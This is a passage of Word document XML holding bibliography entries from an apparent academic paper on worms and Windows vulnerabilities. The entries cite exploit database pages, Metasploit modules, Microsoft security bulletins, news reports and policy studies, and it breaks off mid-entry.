    <w:p w:rsidR="00CB26A3" w:rsidRDefault="00CB26A3" w:rsidP="00EC68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Exploit Database. “Search on description ‘MS08-067’.” Accessed: 14 Mar. 2012. &lt;http://www.exploit-db.com/search/?action=search&amp;filter_page=1&amp;filter_description=MS08-067&amp;filter_exploit_text=&amp;filter_author=&amp;filter_platform=0&amp;filter_type=0&amp;filter_lang_id=0&amp;filter_port=&amp;filter_osvdb=&amp;filter_cve=&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00077CFA" w:rsidRDefault="00077CFA" w:rsidP="00EC68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ey4s. “MS Windows (RPC DCOM) Long Filename Overflow Exploit (MS03-026).” </w:t>
      </w:r>
      <w:r w:rsidR="00EC68CB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Exploit Database</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: 16 Sep. 2003. Accessed: 14 Mar. 2012. &lt;http://www.exploit-db.com/exploits/100/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C0453A" w:rsidRDefault="00C0453A" w:rsidP="00C0453A">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FoxNews</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Conficker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Worm Hits University of Utah Computers.” </w:t>
      </w:r>
      <w:r w:rsidRPr="002456E3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>FoxNews.com – SciTech</w:t>
      </w:r>
      <w:r w:rsidRPr="008618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Associated Press:</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 12 Apr. 2009. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Accessed: </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>7 Sep. 2011. &lt;http://www.foxnews.com/story/0,2933,514681,00.html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00362A30" w:rsidRPr="00861880" w:rsidRDefault="00362A30" w:rsidP="00362A30">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Isenberg, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Henrl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> J. “</w:t>
      </w:r>
      <w:r w:rsidRPr="009A786A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A Benevolent Worm To Assess And Correct Computer Security Vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.” U.S. Patent # US 7,296,293 B2. Symantec Corp</w:t>
      </w:r>
      <w:r>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 Nov.</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2007.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00362A30" w:rsidRPr="00861880" w:rsidRDefault="00362A30" w:rsidP="00362A30">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ISO 8601. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="001D3318">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Data elements and interchange formats — Information interchange — Representation of dates and times</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">." </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ISO 8601:2004, Third Edition. International Organization for Standardization. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="008618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w:t>
      </w:r>
      <w:r w:rsidRPr="008618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2004</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Accessed: 20 Feb. 2012. &lt;http://www.iso.org/iso/catalogue_detail?csnumber=40874&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00172827">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Kirk, Jeremy. “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kelihos</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> botnet, once crippled, now gaining strength.” IDG News Service, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>TechWorld</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DD68A0">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 Feb</w:t>
      </w:r>
      <w:r w:rsidR="00A75391">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Accessed: 3 Feb</w:t>
      </w:r>
      <w:r w:rsidR="00A75391">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&lt;http://www.techworld.com.au/article/414068/kelihos_botnet_once_crippled_now_gaining_strength/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="001C2BD0">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Kizza</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, Joseph </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Migga</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Computer Network Security and Cyber Ethics. 2nd ed. McFarland &amp; Company, Inc.: 2006</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB74C2" w:rsidRPr="00861880" w:rsidRDefault="00BB74C2" w:rsidP="00BB74C2">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Krebs, Brian. “'Good' Worm Fixes Infected Computers.” Washington</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Post: 13 Aug. 2003. Accessed: 1 Nov. 2011. &lt;http://www.washingtonpost.com/wp-dyn/articles/A9531-2003Aug18.html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00162D7C" w:rsidRPr="00861880" w:rsidRDefault="00162D7C" w:rsidP="00162D7C">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Lawler, Stephen. “MS Windows Server Service Code Execution </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>PoC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (MS08-067).” Exploit Database: 23 Oct. 2008. Accessed: 14 Mar. 2012. &lt;http://www.exploit-db.com/exploits/6824/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00F6563A">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Leung, Ka Chun and Sean Kiernan. “W32.Downadup.C.” </w:t>
      </w:r>
      <w:r w:rsidRPr="00F6563A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Threats and Risks</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00F6563A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Symantec:</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6 Apr. 2009. </w:t>
      </w:r>
      <w:r w:rsidR="00F6563A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Accessed:</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 7 Sep. 2011. &lt;http://www.symantec.com/security_response/writeup.jsp?docid=2009-030614-5852-99&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00B757E7">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Microsoft. “Microsoft Security Bulletin MS03-026.” Security </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>TechCenter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B757E7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>10 Sep. 2003. Accessed: 14 Mar. 2012. &lt;http://technet.microsoft.com/en-us/security/bulletin/ms03-026&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00831EF2">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Microsoft. “Microsoft Security Bulletin MS08-067 - Critical.” Security </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>TechCenter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00831EF2">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23 Oct. 2008. Accessed: 14 Mar. 2012. &lt;http://technet.microsoft.com/en-us/security/bulletin/ms08-067&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00831EF2">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Mohanty</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Debasis</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “MS Windows Server Service Code Execution Exploit (MS08-067) (2k/2k3).” Exploit Database: 16 Nov. 2008. Accessed: 14 Mar. 2012. &lt;http://www.exploit-db.com/exploits/7132/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A86643" w:rsidRPr="00077CFA" w:rsidRDefault="00A86643" w:rsidP="00A8664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Moore, HD. "</w:t>
      </w:r>
      <w:r w:rsidRPr="00077CFA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Microsoft RPC DCOM Interface Overflow</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Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: 20 Feb. 2012. Accessed: 7 Apr. 2012. </w:t>
      </w:r>
      <w:r w:rsidRPr="00077CFA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00077CFA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>http://www.metasploit.com/modules/exploit/windows/dcerpc/ms03_026_dcom</w:t>
      </w:r>
      <w:r w:rsidRPr="00077CFA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRDefault="00CB26A3" w:rsidP="000C356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Moore, HD, Brett Moore, S. Taylor, and J. Duck. “Microsoft Server Service Relative Path S</w:t>
      </w:r>
      <w:r w:rsidR="00FA0B9F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">tack Corruption.” </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00FA0B9F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: 20 Feb. 2012. Accessed: 14 Mar. 2012. &lt;http://www.metasploit.com/modules/exploit/windows/smb/ms08_067_netapi&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00A86643">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Moore, HD. “Microsoft Windows DCOM RPC Interface Buffer Overrun Vulnerability.” </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SecurityFocus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: 11 Jul. 2009. Accessed: 14 Mar. 2012. &lt;http://downloads.securityfocus.com/vulnerabilities/exploits/dcom.c&gt; </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="004333B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Nuclear Regulatory Commission, United States. “NRC Information Notice 2003-14: Potential Vulnerability Of Plant Comput</w:t>
      </w:r>
      <w:r w:rsidR="004333BB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">er Network To Worm Infection.” </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Office Of Nuclear Reactor Regulation. Washington, DC: 29 Aug. 2003.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="009279D5">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Owens, William A. and Kenneth W. Dam, and Herbert S. Lin. “Technology, Policy, Law, and Ethics Regarding U.S. Acquisition and Use of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cyberattack</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Capabilities.” Committee on Offensive Information Warfare, National Research Council: 2009. p. 248.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00D34896">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Pauli, Darren. “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Govt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> stays ISP zombie laws.” </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Security</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00B07B08">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ZDNet: </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">26 Nov. 2010. </w:t>
      </w:r>
      <w:r w:rsidR="00B07B08">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Accessed: </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>7 Sep. 2011. &lt;http://www.zdnet.com.au/govt-stays-isp-zombie-laws-339307564.htm&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00E62AC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Pinal County of Arizona, USA. “Use of Login Banners to provide legal Notice to Users.” </w:t>
      </w:r>
      <w:r w:rsidR="00E62ACB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Pinal: </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>22 Oct. 2008. Accessed: 6 Feb</w:t>
      </w:r>
      <w:r w:rsidR="00B712A0">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w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>&lt;http://pinalcountyaz.gov/Departments/HumanResources/Policies%20Procedures%20and%20Rules/pnp2.45.pdf&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00172E51">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RFC5848. </w:t>
      </w:r>
      <w:r w:rsidR="00172E51">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Signed </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
